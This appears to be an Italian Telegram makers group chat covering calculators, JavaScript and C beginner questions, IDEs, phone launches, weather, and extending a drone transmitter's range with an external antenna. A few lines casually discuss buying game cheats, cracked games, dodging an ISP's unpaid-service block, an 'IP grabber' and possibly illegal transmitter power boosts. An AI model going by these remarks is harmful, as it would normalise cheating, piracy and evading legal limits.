Ma in tutta Italia, lo sci fuoripista e scialpinismo sono legali, anche se in alcune regioni ci sono degli obblighi, in valle d'Aosta e obbligatorio per lo scialpinismo l'artva mentre in Piemonte e obbligatorio per lo scialpinismo la pala e la sonda
Ma oggi presentano l'S9?
Ciao a tutti, mia nonna possiede un telefono doogee. In qualsiasi schermata che vada appaiono poupup pubblicitari. Secondo voi cosa è è come si può sistemare?
Sono l'unico a cui è venuta la pazza idea di mettere Linux su un TomTom One?
Va beh vai a madonna di Campiglio già che ci sei
Non c'è la fai
I Tom Tom sono fatti in un modo strano ci devi studiare sopra un bel po' anche solo per mettere un firmware custom
Sono basati su winCE in genere
OpenTom 
sto compilando adesso
Dodge?
Ok abbi pazienza scusami, l'ho scaricato ma ora?
Come lo installo?
I pacchetti dovrebbero essere .deb a quanto ho capito, ma qui non ne vedo..in particolare con i nomi di readme
doogee
lui?

cmq, 
 volevo dirti che mi hai ispirato alla fin fine....l'ho presa
LEI
Pazzo
abbastanza
Ma non è buona questa
tu devi solo che stare zitto
aiutino
(function (global) {
    document.getElementById("save").addEventListener("click", function () {
        global.localStorage.setItem("mySharedData", document.getElementById("first_name").value);
    }, false);
}(window));
mi da errore "Uncaught TypeError: Cannot read property 'addEventListener' of null"
come mai? :(
su jsfiddle funziona
Ma questa non puoi manco usarla in facoltà mi sa Almeno da noi non fa
Pero è figa a mazzi
Bah è sconsigliata da tutti, hanno tutti la ti 89 e al massimo la nspire cas
l'importante è quello ù-ù
si ma devi anche capire che 1)mi serve una calcolatrice e 2)non ho 200 euro
Sono abbastanza soldi buttati quella è molto limitata
e tutte quelle che trovi a 90 euro sono spedite dall'america quindi le paghi 600 alla fine ._.
Io ho una HP 49 gs mi pare..l'avevo trovata in offerta...ma mi bastava la classica casio delle superiori alla fine
massì, mica mi devo laureare in matematica, mi serve solo una buona calcolatrice che mi duri un po' di anni, le altre sono a batterie ._.
almeno questa si ricarica come i telefoni
e poi le altre non credo mi lascerebbero usarle a scuola quindi...
Si ma quella che ha nico è meglio  e costa meno
beh, capiscimi, io quella casio che tutti hanno non riesco ad usarla, è complicata per me
Stai scherzando? È molto superiore
non mi interessa
Dimmi com'è, anche per l'aggiornamento delle mappe
mamamama...cercando su internet, 

È limitatissimo quel modello
Che io l'ho aggiornato ma non mi pare abbia aggiunto strade
e vabb così dai
già meglio della casio :P
Ma si se non deve fare cose particolari non serve che sia superiore..la cosa piu utile che uso della mia (rispetto alle classiche) è che avendo tante linee faccio un copia e incolla rapido nelle formule Quando il gioco si fa un po piu duro serve Excel, se si fa piu duro altri software appositi..come sempre
Sulla hp 49 ci puoi installare le applicazioni, puoi risolverci i problemi di elettrotecnica, risolverci le travi di sdc
Più che altro per integrali e sistemi
pure qua ci puoi mettere le applicazioni, per l'elettrotecnica non ci fai nulla, tanto non mi serve quello
e l'importante è che ci sia la scrittina texas instruments che dice tutto ù-ù
Peccato sia a colori quindi la batteria durerà 3 ore... Comoda
perfetta per quel che mi serve
E il 99% dei prof non te la farà usare
io la userò un'ora alla volta massimo
tranqui, ghe pens mii
*quando hai i professori più gentili dell'universo*
Ma per cosa la vuoi usare?
per scuola, mi serve per i compiti, per le lezioni quando ci danno esercizi in classe, per le verifiche, forse per le verifiche no ma ok, no prob, ne ho altre che posso usare(anche se mezze distrutte), e poi anche per altre cose
Per trovare la massa dall'energia ti serve?
è una calcolatrice, 

non mi serve che mi faccia l'esercizio lei, mi serve per non fare i conti a mente
Quando la fotocamera non ci sta, ma agli ingegneri sale l'ignoranza 
Ti assicuro che la casio da 10€ è più rapida per fare i conti
k
no....NO
Che figata
Io ho anche una Texas (b/n) ma mi si è rotto il display, si spengolo delle righe verticali a intervalli non costanti e non sempre le stesse..chissa cos'è
posso togliere la batteria al telefono ed alimentarlo con l'alimentatore del pc?
no vabbè non capisco :(
Ma questa non ti piace?  
dovrò abusare di  

Ma la hp la utilizzi in notazione polacca?
devo storare un valore di una variabile dentro il browser così che possa essere utilizzata da più file JS
e voglio usare localStorage
eeee, ci avevo pensato, però ci sono un po' di motivi per cui non l'ho presa....
perché mi fa questo? :(
non dovrebbe ritornare myCat?
Quando la fotocamera non ci sta, ma agli ingegneri sale l'ignoranza 
alla fine sono andato per questa, semplicemente anche perchè una calcolatrice a me serve per fare i conti e non per tutto quel che quella calcolatrice offre...
WTF
Vabbè allora prendi una Sharp da 30€ 
Sta nevicando erano 5-6 anni che non vedevo nevicare
C#
cosa mi dite di questo linguaggio?
Perché ho una voglia matta di programmare, ho anche acquistato un libro a riguardo, ma vorrei sentire anche qualche recensione
 ti può dire qualcosa a riguardo
Comunque allo stesso prezzo ti vendevo la mia hp 50g (guarda quanto costa)
L'ho vista anch'io........ poi ho pensato:"meglio la calcolatrice da 2,80€ che ho comprato in super saldo al supermercato in vacanza. Ed è pure una casio scientifica"
Che figata assurda, almeno non è in mezzo al cazzo
console.log(cat);
Nono quella normale ma non è che la usi spesso...non ho tanti esami scritti
Io la ho usata pochissimo
Comunque usata in rpn
Raga ho 55 € su Amazon che mi consigliate di acquistare?
si si
poi ho risolto da solo
non sapevo che ('myCat', 'Tom') stess per nome proprietà
pensavo che fossero due variabili separate
No io no ma so che una volta che ci si abitua si è piu veloci nei calcoli..ci ho solo giochicchiato con quella notazione diciamo
dildo bluetooth
Ho preso la yi lite 4k
Qualcuno mi sa aiutare con la foto di grub customizer che ho messo sopra?
 deve essere utilizzato solamente all'interno di una funzione
non ci riesco, ora faccio i compiti, poi lavoro al blog e poi riprovo 
dimmi che è motorizzata e quando non la usi si abbassa 
è stato bello 
comunque
altra domandina
che plugin usate per visual studio code?
Che sistema operativo usi?
ubuntu
oggi ci sta l'unpack del nuovo s9
beh, spero bene di si
È a molla e si richiude quando chiudi il pc per la pressione
cos'ha fatto?
2 minuti
Ho deciso
Forse faccio un formattone e mi copio la parte dove avevo elementary
Raga, che IDE utilizzate?
No flame, pls
Per quale linguaggio?
Credo che ne uso 5-6
Mh, facciamo C dai
O qualsiasi, datemi dei nomi seguiti dal linguaggio con cui lo usate
Python python
Io uso Code::Blocks(credo si chiami così)
Python l'IDLE
Preferisco DevC
C# Visual Studio
Visual studio?
Top
Scusa sto facendo troppi messaggi, li integro in uno solo
Visual Studio Code?
Tranquillo hahahhaha
Code?
Community mi sembra, cioè quel coso grosso più grosso, cioè Visual Studio 2017 o 2015 o 2013(li ho tutti e tre)
Quello che pesa 4798327480932874903284GB?
credo di sì
Ok, è il community
quel mattone pesante come mercurio
Per C#?
Si
Io tempo addietro provai visual studio code ma da buon scemo, non lo seppi impostare
Quindi via di DevC
Ah io non ho mai usato Visual Studio Code, DevC sì però non mi stava tanto simpatico
VSCode è utile per webdeveloping
Come Atom e simili
Un buon IDE per C/C++?
Quindi js va bene?
Ah ok io pensavo tipo Visual Basic
per js si
PyCharm
Io IDLE 
  che modello è il tuo portatile ?
uno schifo, evita gli hp
Cosa mi consigli ?
L'hai fatto con na guida ?
Asus se puoi
poi così dal basso farà anche cagare la prospettiva
è tipo un pulsante, esce solo se la premi
Vim
no, scherzo
ah vabbè, meglio di niente
che mmerda però
cmq gente ho trovato il sito della svolta io : 
 io userei questo stile per ogni sito internet esistente solo per ricordare questo
Pffffff
sembra tanto quei siti in cui se paghi in automatico la tacchetta della velocità di download esplode ad infinito ma in realtà è più lento di prima
Io no
orribile
così veloce che non esiste una shortcut per la cronologia
Il ritorno di "cosevarie"

 ‎€1‎.6‎5 ‎in‎ve‎ce‎ c‎he‎ €‎4.‎14
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 6‎0.‎14%
⭐️‎ 4‎.8‎9 ‌‎/‌‎ ‎5.‎00‎ (‎18‎3 ‎re‎ce‎ns‎io‎ni)
✂ 
: 

 Store: Gearbest
 

fail 
"Ma perchè non analizza il link? Mm 🤔"
LOL mi sono messo a inviare link qua perché pensavo di essere nella chat col bot
Esatto
Ha detto cose varie

 ‎€1‎3.‎49‎ i‎nv‎ec‎e ‎ch‎e ‎€3‎9.‎99
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 6‎6.‎27%
⭐️‎ 4‎.6‎0 ‌‎/‌‎ ‎5.‎00‎ (‎15‎0 ‎re‎ce‎ns‎io‎ni)
✂ 
: 

 

 ho deciso di seguire il tuo consiglio, ma adesso........ formattato tutto o solo ke partizioni interessate lasciando Microsoft, uefi, ecc
HAHAHHAHA
Ragazzi.Io vi avevo raccontato un video,dove parlava come cambiare IP del sito del operatore, quando non hai pagato i soldi dell'nternet e vai in qualce sito spunta il sito del operatore. Mi avevate detto che se io provavo ad imbrogliare e usare internet gratis me lo bloccavano. Ma cosa succede se uso intenet del cell con pc?
Appena finito portal
gg
Mamma che ansia mi ha messo quel gioco 
why?
da dove l'hai scaricato? 
Perché è fantastico
k
Hehe, o crakatto pkè sn akker
*cof* *cof* skidrow *cof* *cof*
Tra l'altro ho scoperto che l'exe che lo esegue dovrebbe lanciare anche half life
Peggio ancora 
Link su yt, scaricato su sandbox, analizzato a dopo un giro su virustotal decompresso
beh dai, 
 skidrow è sempre con noi gio
ti devi curare te
Se mi ammalo meglio, non mi metto a studiare per domani
io ho già studiato, sono pronto a prendere 4.5 :D
sia in storia che in scienze della terra
Da noi domani scuole chiuse :D
Ho visto 
Roma no?
No
No?
In culo al mondo
Ah vicino casa mia allora
Si
150 metri dritto poi giri a sinistra, abito nella casa al secondo piano
Ragazzi se c'è un update per una custom rom posso direttamente flasharlo senza dover formattare tutto vero?
no
Si maaaaaa dove? 
rip
Chi ha GTA5 per PC?
Io l'avevo craccato ma hanno fixato 
Benvenuto 
Io
Secondo voi è possibile cambiare l'antenna di un radiocomando per il drone?

Vorrei avere un range più ampio ma non ho soldi per un altro radiocomando
 magari te lo sai
Arcobaiter Triggered
Tutto è possibile
Wut

Escopost - Radioamatori - PLC Forum

Lui lo fa 
Si più o meno ci metterei quelle antenne 
Quindi se io ordino un attacco giusto e una antenna posso farlo teoricamente?
Cosa potrebbe andare storto?
Spammare in modo poco subliminale il tuo profilo SoundCloud ma facendo finta di niente camuffando il tutto con Rai Sport: lo stai facendo nel modo giusto 
Scusate ragazzi ma che differenza c’è tra il Raspberry Pi 3 modello base e il modello b?
io vedo solo il Model B in giro 🤔
Beh intanto devi vedere se va a a onde radio o a infrarossi
Se va a onde radio devi trovare un'antenna che trasmette sulla stessa frequenza del drone
Comunque si teoricamente è possibilissimo
Il mio rc è il FlySky FS-i6s
Manco me ne ero accorto
Se è spam tolgo
Modifico e rimetto
Ma no tranquillo 
Io pensavo di prendere pure un'altra ricevente quindi devo controllare solo che comunicano correttamente
Mi sorge spontaneo chiedere perché nessuno lo faccia.
Perché nessuno si è mai messo una super antenna sta moddata che prende a 100km 
È che vado comodo ad incollare direttamente lo screen su telegram 
perchè è un pelino illegale maybe? 
Let me introduce you to Win+Shift+S
Ingravidami
Ok? Ciao a tutti
Ma se io prendo un radiocomando da 50 euro lo modifico e ci metto un antenna che prende a 5km è illegale?
Heyyyy
Io
Anche Marco ha avuto la stessa reazione ieri 
Ti amo 
io l'ho sempre detto
Diciamo che io sono il più raffinato fra i due
Ma hahahahaha
Ma ahahahah "io so usare windows cicca, tu no"... Vero 
?
Beh principalmente per il costo
Guys, un buon ambiente di sviluppo per C/C++?
se il drone riceve sulla frequenza 2Ghz riesci a fare 50 metri tranquillamente
E non costa neanche tanto
Sarebbe la frequenza del wifi
Ti costa molto di più se ti compri un rc che ha quella portata però
Ma il drone ha un massimo di frequenza?
Dipende da come è costruito il drone
Il mio è un drone costruito da me, il controllore di volo è un Naza M v2
Cioè ci sono droni che ricevono a 800 MHz e altri da 5Ghz
Quando possiamo giocare?
Eh io ora non me ne intendo molto di droni... Comunque se il telecomando trasmette utilizzando frequenze radio puoi alterare le distanze
Più è alta la frequenza più il raggio d'azione aumenta
Ok
Domani cerco un po' su internet, vediamo cosa riesco a fare
Il raggio d'azione dipende anche dalla grandezza dell'antenna, più è bassa la frequenza più l'antenna dev'essere grande per ricoprire una zona maggiore
Comunque se trasmetti a 5ghz o a 2.4ghz non hai problemi di dimensioni dell'antenna

Perfetto, tanto il mio radiocomando rientra tranquillamente in questi parametri
Comunque fai attenzione perché più è alta la frequenza più c'è il rischio di distorsione delle onde in presenza di liquidi o di metalli
Avvolgi l'antenna nella carta argentata e modellala a forma di parabola
Ok!
non funziona
Ahahhhahhahahhhahhahh
così triggeri il fisico che è in me
Subbbito su ignOHMranza
+1
Eii hahahha
Questo metodo può essere utile per evitare la dispersione del segnale
Hai una trasmissione più forte ma le distanze rimangono quelle
Credo
+2
Ho letto che una antenna del genere è facile da fare solo che devo trovare il modo
260€ sono una rapina per un'antenna
No, ignHAMranza
Linka
Eh sì
Be è come se il segnale fosse l'acqua che esce dalla fontana, se tu ci fai tipo un muro di forma parabolica dirigi il getto verso un punto e il raggio si concentra e si allunga
Io l'ho fatto con le antenne del modem




Non è cambiato un ca però almeno ho un modem più figo ora
Wifi -> 2.4GHz -> le onde riflettono sulle pareti
Devo comprare dei btc
Sapete dopo posso procurarli?
Per cosa ti servono?
Devo comprare delle hack per h1z1 ma accettano solo btc
Solo btc?
A quanto pare si
Lascia perdere allora
C'è scritto solo bitcoin
Perché?
Molto probabilmente c'è qualcosa sotto, comunque dovresti spendere una cosa del tipo 20€ in più che io sappia
Un mio amico ha comprato su sto sito e mi ha detto che devo solo aspettare una cosa come 30minuti e ho la key per il prodotto
Cosa devi comprare?
.
Io ti ho dato il mio parere ☺️
Pvt
E perché vorresti rovinare l'esperienza di gioco ad altre persone?
Ahahahahah
Andato bene il primo giorno di vacanza?
Ma oggi più che altro ci siamo sistemati
Si vabbè, andato bene?
E purtroppo ho cattive notizie
Tipo?
Azz
Rippissimo
Fa salire abbastanza i nervi vedere i video in queste condizioni
Domanda a caso.......ma voi che andate alle superiori avete la password del registro?
Meglio, così ti godi la vacanza
Che % è di batteria?
75
Madò mo lagga pure Spotify
Ah peccatp
?
Okay, questo è troppo
Cioè rendetevi conto, se invio un messaggio su Telegram lagga lo streaming mentre invia il messaggio
Nulla... Fosse stato 77...
Eccolooooo 
Telegram X?
Yess
Mi stai facendo venir voglia di metterlo
Si accettano scommesse sul se riuscirò a vedere un video su YouTube
Metti direttamente un sondaggio no?
O devo tornare a sfrattare gente nelle stanze dove prende di più come ho fatto un'oretta fa
Nah
Perché tutti hackerano e non riesco a giocare
Ahahahahah X2
Windows è facile da installare dicevano......
Its simple
L'ho installato oggi
Vaffanculo
Che hai usato per installarlo?
?
Si, in molti lo fanno (anche mr steele le cambia sempre) e puoi guadagnare anche parecchio... però occhio che se la saldi male bruci il telecomando
Sera romboli
Il tool Microsoft?
\rendeteQuestoPesaventoAdminDelMondo
eh?
Ma come faccio a capire quanto tempo va a prendere il timelapse in totale sulla yi? Nell'applicazione ci sono sono 2 parametri gestibili: l'intervallo tra uno scatto e un altro e la durata del video
Sera guys
Comincia dal piccolo.....rendilo admin Di questo gruppo 
È già admin
Admin supremo
77
Ti deve spodestare
Forzato però
Vista la live di presentazione di s9?
Intanto c'è
nope ero fuori
Merita?
Consigli per costruire un'antenna del genere? 
Bho era su una vecchia chiavetta
Grazie
Ma il video lo monta automaticamente a 24 o 25 fps?
Ah Sorry ho capito
Non ti sei perso niente
Domani alle 8:30 se presentano la a6700 vi prometto che divento povero
Noi aspettiamo il tuo annuncio su subito
Se la firmi vale di più?🤔
Dipende chi la compra
Potevo firmare il ryzen tagliando col tronchesino i pin a forma di "oV", vero 
? 
Ahahahah
Comunque non ho visto niente di spettacolare su s9, anzi.....sembra s8
Beh... Ci sta
La fotocamera figa
Con apertura variabile...
E poi?
Design scocca terribile a parer mio
Sì?
Meglio di s8
Almeno il sensore di impronte è raggiungibile
Ma perché hanno cambiato la forma?
Dici più squadrata?
 una cosa figa della presentazione te la sei persa.....i pass
Il sensore ovale
Ah 
Naaa ci sta dai
quello di galeazzi?
Eh? No, dico che hanno fatto tipo una cosa figa con i badge che sembrava di avere in mano s9
In realtà aumentata ovviamente
Secondo me è proprio brutto 
Piuttosto che rettangolare...
Lo preferivo come nel mi a1
Uuuh figoo
Questo s9 proprio non mi convince, non mi viene da spendere tutti quei soldi
È stato bello vedere tutti con i telefoni in mano a provare 
A me non verrebbe comunque 
Per quella cifra 
900€ cazzo
Già 
Comunque mi sono sembrati poco carismatici
Forse impressione mia
Boh
In ogni caso Casey lo avrà... Ieri 
Ehhhh, e non solo lui!
non ti saprei dire onestamente
ottima sceltauna belva
Fatti un antenna enorme e la monti sul tetto di casa e la colleghi al radiocomando
Costa solo 50€
Ti dirò di più, se vai in discarica è addirittura gratis
Serio?
Si trovano così?
yup
massì, è facilissimo
HAHAHAHAAHAHAHAAHAH
Io pensavo proprio di non saldare ma prendere un cavetto apposta. So che esiste ora devo solo trovarlo
Ahahahahahhahha
Olimpiadi di robotica?
Buongiorno
s8 -> 800€
s9 -> 900€
Con questo non serve saldare no?
Al trony da me l's8 costa tipo 640€
E spero che con l'uscita dell' s9 scenda ancora di prezzo
E dovrei cambiare pure la ricevente giusto?
Finisce l'installazione e alla fine mi da un messaggio di un errore
Tizio dei bitcoin Di ieri! Vedi che i bitcoin continuano a scendere da 3gg, mentre il resto sale
Scusate una cosa, ma un'antenna può supportare qualsiasi frequenza?
Cioè questa la posso usare anche per la frequenza 13.56Ghz??
Raga quali sono le differenze principali tra onde a 2.4 GHZ e 5 GHZ?
C'ha detto?
Ma che è tutto sto consumo?
Roma alle 8 e mezza di mattina cosa che non si vede spesso
Boh ti stanno minando la Ram
8gb di RAM totale, nemmeno il PC mio consuma 4gb con Firefox e uTorrent
Che bello essere bloccati in stazione a causa della neve
Comunque meglio così rimango di più nel mio paese natale
Ma
Il cartellone dei treni è diventato un blue screen
Lo stanno riavviando
Kernel paniccc
Non riescono Xd
Ciao scusa potresti mandarlo anche a me ?

Ma sul web si trovano ?
Nevica a Roma e ovviamente io sono in Trentino
Eh, la perturbazione si è spostata a sud, ieri mattina nevicava qui al nord
Buongiorno, con Linux qualcuno sa come posso accedere alla rete di facoltà? Io sono a Cagliari e ho UniCaMente ma credo che sia simile alle altre uni..
Non capisco come entrare nella pagina del login, con windows mi ci entra in automatico
Dove?
Marilleva
Ah okok
Comunque come cavolo fate che ci stanno -20 gradi
Eh... Fino a l'altroieri ero fuori in maniche corte
Eh? 
Che il freddo è arrivato tutto ieri, ma un po' in tutta Italia
Marco il solito esagerato
Io sto aspettando che si svegliano i miei amici seduto sul termosifone
Mo che usciamo ci piglia un colpo
Ah ecco
Beh comunque a Roma é previsto -12 domani
Qua a Padova invece solo -7 stamattina
Infatti non si stava malaccio
"solo"
Io sono ancora abituato ai 40° d'estate, quest'anno sento particolarmente freddo
Solo 
 sentiva freddo stamattina
Ecco, io con 40°C starei dentro a una cella frigorifera, mica li sopporto
cioè, ieri se cadeva un fiocco di neve era un miracolo e adesso ci sono 10cm di neve
ma vabehhhhhh
La questione è ritardata a quanto pare: stamattina hanno presentato gli smartphones ma le mirrorless le presentano in Las Vegas Time, in pratica in modo che in USA sia giorno
Quindi stanotte all'una diventerò povero
Intanto canon ha buttato fuori la nuova EOS M50 entrando finalmente nel mondo del 4k
Ok risolto dovevo scaricare un file .sh e usare un comando da terminale..grazie comunque:)
Aspettiamo la foto del tuo conto in rosso allora
Nono siamo troppo vicini alle elezioni per far diventare il mio conto comunista ☭
Mmmhhhhhhhhhhhhhhhhhhhhhhhhh
Che telecomando hai?
Ahahahahahah
Buongiorno
Copate
Tu sei fuori
Mannaggia al riscaldamento globale
Mannaggia alla Russia
Ma sei a Marilleva 900 o Marilleva 1400?
Sono due i paesi
Per me voleva fare l'umile ma è a madonna di campiglio
Hahahaha
Comunque pensate che abbiamo -20 in Italia ma il fottuto polo nord è nel periodo più caldo di sempre: hanno avuto 48h di seguito SOPRA LO ZERO (ed è il polo nord, eh.... Ed è sempre notte in questo periodo)
FlySky FS-i6S

Allora no, quel coso praticamente tu lo saldi dentro, poi trapani la plastica del telecomando e ci incastri lo spinotto sma femmina (l'altra estremità del coso che compri), così poi per cambiare antenna basta che la avviti e la sviti dall'sma (in pratica esattamente come fai con l'FPV)
Il freddo è andato in vacanza
Questo porta a 1.5km (dai 300m standard)
Eh si 
Anche perché per capirci qualcosa non basta una laurea in fisica
Replichi progetto?
Ho paura di bruciarlo, però si potrebbe fare direi 🤔
Basta però in fisica del clima 
Poi ci sono quelli che invece dell'antenna esterna attaccano un booster da 3-4Watt e arrivi ad avere un range tipo terra-luna 
EME qrp? xD
La vacanza la fa proprio in Italia
A proposito di fisica, voi inutili fisici che studiate i doppi pendoli non potete competere con gli ingegneri, guarda qua:
L'unico modo per bruciare un trasmettitore con un antenna, è usare un'antenna sbagliata per la frequenza di trasmissione
Bravooooo
Mindblowing 🤯
Oppure accenderlo senza antenna
Peccato che senza un po' di meccanica lagrangiana  e Hamiltoniana non si possa scrivere l'equazione del moto
E inutile lo dici a qualcun altro 
Si ma è triplo 



C O M E  🤯
eh ma non è un campo così chiaro comunque, non credo nemmeno sia così dimostrato un modello abbastanza esaustivo del riscaldamento globale, non è nemmeno tutto da escludere che sia dovuto in parte ad un ciclio geologico XD
Che è come avere come antenna solo la pista che collega il trasmettitore al connettore, quindi ros elevatissimo
Eh vabbè, con le equazioni di Hamilton-Jacobi fai veloce
Grazie mille!!!!
Si esatto
Bruciare cosa?
A studiarlo, ma bilanciarlo wtf
Tutto il trasmettitorr
Il finale del amplificatore rf
Praticamente la "motherboard" del telecomando
'azzo 
E per evitare ciò devo saldare molto precisamente?
Guys, tanta neve
Era successo al mio FS T6, quello che ho regalato in giveaway, si era bruciato tutto
Per bilanciarlo devi prima studiarlo
Mi metti paura così
raga ma da voi nevica?
Fortunatamente su AliExpress si trovano le schede dei telecomandi a pochi soldi
In valle d'Aosta no

Trentino no
Da me sta tirando giù l'oceano ghiacciato
E qui 
 muto
Ahahahhahahaha
Non sai quanto la adori io 
Un botto
Altro che la fisichetta delle forze che si sommano... Quella roba lì è elegante
Non solo a te, vero 
?
Marco non fa Ingegneria informatica però
Come vado a capo nell ip grabber?
1400
E Dio Cristo se fa freddo
Mi si sono ghiacciati letteralmente i guanti mentre sciavo
Io sono in Spagna
Qui a maniche corte

Minghie, allora si eh
marco dove posso trovare il mio referral su gearbest? 
?lkid=12357131
no scusa ho sbagliato domanda
come posso creare il mio referral
Devi avere un canale famoso, o un qualcosa
Sennò non te lo danno
ah ok
Alternative a chromecast?
Arrivata
Qualcuno che conosce raspberry pi3  bene nel gruppo? (Linguaggio python)
Python si rpi3 lo ho usato per un paio di prove (controllo di pin gpio)
Giorno ragazzi
Un mio amico avrebbe bisogno di una mano con un suo progetto per gli esami... Se entra qualcuno riesce ad aiutarlo che è bloccato
Ho un quesito per voi, purtroppo sono totalmente inesperto
rpi zero w
Elimina questo messaggio
Ma che culo
Y? :(
Non regge
In C, c'è un modo per convertire i secondi in ore, min e sec?
Nel caso io voglia usare sec/60=min ecc, non mi troverei poiché in un calcolo finale, i secondi sono diversi da quelli input
In C c’è modo di fare tutto
In che senso sono diversi?
Vi spiego
Aspetta ma sei l'admin della page Instagram?
Cioè, quella che tratta appunto l'informatica hahaha
Lol
Si lol
Allora
Do ad esempio in input 125
Che equivale a 
0 h 
2 min
5 sec
Sì
Per fare ciò, faccio
125/(60*60)
125/60 //Valutandoli int
125%60
Ci siamo?
Sì
Ok, prendiamo un numero più grande
4000s
Per invitare gente nel gruppo devo chiedere a Marco vero?
No
Commo se fa?
Di' alla gente di entrare in 
Okk thx
4000/3600= 1
1h
4000/60= 66
66 min
4000%60= 2400
Cos
L'ultimo è impossibile
Appunto
:




:




:

In PHP %=resto?
Comunque grazie mille
Sì
Come in C
In molti linguaggi % è il modulo (o il resto della divisione, è uguale)
Mh
Grazie mille ragazzi
Geniale mettersi come sfondo l'orario
Che figata le nuove notifiche di youtube con la copertina grande
Metallurgia è bella?
Bah per ora non troppo
Preferivo la metallurgia di Mistborn
Taci tu, va'
Senza apostrofo... O accento
Gramar nazi is life
Ero assolto nei pensieri
Chiedo perdono
Posso inviare un codice qui?
Sono poche righe, scritto di getto, giuro
Meglio pastebin, a meno che non siano 5 righe di numero mandate mettendo ``` prima e dopo il codice
Grazie
Non ti serve
Ecco, il problema è che se ad esempio mettessi 3601, il risultato sarebbe
1 ora
0min
0 sec
Sbagli a calcolare i secondi
Ah, allora sposto tutto lì
Perché..?
secondi=tempo%60;
Invece di
secondi=secondi%60;
Vero, giusto
Grazie mille
Prego
Ragazzi help....come lo collego alla naza?
UUuuup
È così bello stare ore sulle spiegazioni dei diagrammi Fe-C, elementi alfageni, ecc
Ma perché cazzo lo tagghi?!
Io ho fatto una domanda....se sei in grado di rispondermi te mi faresti un favore
Ho taggato lui per andare sul sicuro?
Sei in grado di darmi una mano?
Non saprei cosa dirti, ma non ha un fottutissimo senso taggarmi in ogni minima cosa!
Anche lui ha una vita!
Non esiste solo il marco di overvolt
Lo so.....quando avrà tempo e voglia vedrà il messaggio e magari mi risponderà
Ragazzi, mi sono posto un'altra domanda: in C usando solo <stdio.h>, è possibile creare un programma che visualizza separatamente le centinaia, decine ed unità di un dato numero?
Mi sto ponendo tutti questi problemi hhahahah
Leggi il numero
Easy
È matematica base
E poi lo dividi per 10 ogni volta
Eh, ma dai hahaha, intendo, separati
Li separi a posteriori con un for
Circa, e se dividendo, l'unità è maggiore di 10? Ho bisogno di far capire al programma che deve aggiungere una decina
for( tmp = numero; tmp > 0; tmp /= 10)
     printf("%d ", tmp%10);
stampa prima le unità, poi le decine, poi le centinaia e così via
tmp? Cosa intendi?
è una variabile temporanea, serve a non perdere il valore di numero
Ah, quindi la utilizzi come appoggio, insomma
Variabile d'appoggio
esatto, puoi anche non usarla se poi non ti serve il valore di numero
Fammi pensare
Allora, voglio stampare prima il risultato generale e poi le centinaia, decine e unità, separatamente
Quindi prima metto un printf che stampa il numero, successivamente utilizzo il far ed infine stampo tutto separatamente
Una domanda: da quanto programmi? hahaha
abbastanza, ma questo esercizio è tra i primi che propongono per imparare ad usare i cicli
Sisi, infatti sono all'inizio
Non a caso, non so utilizzare i cicli
 esercitati che in C si fa tutto con cicli, funzioni e puntatori
Io queste cose le sapevo fare in c++ dopo una settimana di lezione
infatti sono la base 
Ragazzi mi sapete aiutare con il mio cellulare android?
Come sei riuscito a stampare la vite?
Come hai impostato la stampante? A me non si stampa bene
Sì stampa come qualsiasi altra cosa, nulla di particolare
Al tornio si può fare tranquillamente

qualcuno che puo farmi una favore? mi servirebbe uno script
Mmhh...
K
basta che gli mandi 
adminAntiTagMode: ON ✅
 tu hai kali sul raspi?
zi?
prima di tutto devi dire su quale dei tre raspi 
uno lo usa per switchando, l'altro per retropie e il terzo boh
ah già che è ricco e ne ha tre
fiiigo
a me serve sapere se bastano 4gb per kali
perchè ho solo trovato microsd da 4gb e non vorrei sacrificare raspbian
Vendono ancora le microsd da 4?
yup
So che da un paio d'anni in commercio il minimo è 16
bho
nope, il pacchetto con tutti i tool pesa 10+ GB
azz
E su Amazon le cinesate da 8GB costano quanto le SanDisk UHS-3 da 16GB
non vorrei comprare una 16gb solo per kali :I
A cosa servono i due potenziometri???
Qualcuno sa dirmi perchè quando metto un ip sulla barra url del cellulare mi appare una pagina di aphace2
E non mi fa accedere
è normale...
Significa che non c'è nessun file nella cartella di Apache
come vuoi accedere scusa?
per accedere serve l'ssh
Io ho perennemente caldo e la mia immagine di profilo lo testimonia ahahahah
Chiesa in Valmalenco (2100 metri)
bello github senza css...
Ahahahahah
 è down?
Non ne ho idea
a quanto pare...
Ci siamo ridotti a questo?
Si
Già, e se dici così ancora non hai visto quella di Renzi
Si guarda 

Ma vi ricordo di evitare politica almeno fino al 4 marzo, sennò partono i mega litigi che tanto online si riducono sempre a:

- A dice la sua
- B dice la sua
- A urla la sua
- B urla la sua
- Maria io esco
- Ecco, e vedi di andartene affanculo
Mi hai anticipato, stavo scrivendo un messaggio troppo lungo 
🆎 

DI Marco [
]
GRUPPO Makers ITA [-1001108947027]


ci voleva 
BANNATELOOOOO
AHAHAH
Beh almeno sono online se fossero faccia a faccia probabilmente si ridurrebbero a una rissa
Si, in Italia facilmente si 🤔
È già tanto che la moglie e i figli del tizio della pubblicità del PD non si siano messi a picchiarlo, ma probabilmente perché stava guidando 
Idee diverse in Italia, sotto qualsiasi ambito... ❌❌❌
Comunque quella pubblicità è abbastanza ridicola... Come avrebbe fatto Renzi a sentire tutta la conversazione e ad apparire magicamente
uups
scusate
Hahahahhahahha
Spoilerrr
Tre giorni all'apertura di 
 raga 
Ahahahaahahahahaha
the hype is real
shit, volevo copiaincollare ma ha preso la schermata sbagliata
fate finta di niente 
Hai spoilerato un intero articolo del blog 
eeh sì
Ah ma tanto non possono vederlo prima di tre giorni 
stavo rimuovendo i <code>
così sei cattivo però hahahahah
Simpatico come l'ulcera 
Eddai, soffro dentro se fate così
Che poi in realtà ormai sono quasi due 
TACI CHE MANCANO 85738365 ARTICOLIIII
妈的 
mm non funziona il 
ah sì
grazie ❤️
Non è vero
Vuol dire "oh shit"
Non c'è una volta che abbia capito giusto il cinese, questo grouphelp

Qualcuno sa come va collegato?
Ragazzi help....come lo collego alla naza?
Un solo cavo, da ibus (orizzontale) alla porta ibus della naza
Grazie❤
È un pelo più volgare di accidenti ma ci sta
What? La mano sa tradurre roba?
Yup, comando 
Fico
Oh meglio...
Cool
No... non funziona così temo...
Ok ci rinuncio... scusate lo spam di prova
tutto un gomblotto
fortunatamente sono minorenne e non devo votare
 lo prendi l'airdrop di friendz?
Forse funziona con alcune lingue... Anche se l'inglese è strano che non lo traduca
Appunto... boh
Raga, giusto per curiosità, c'è qualche vigile del fuoco in questo gruppo?
Si 
Perché sto facendo un cartellone sull'uso dell'estintore
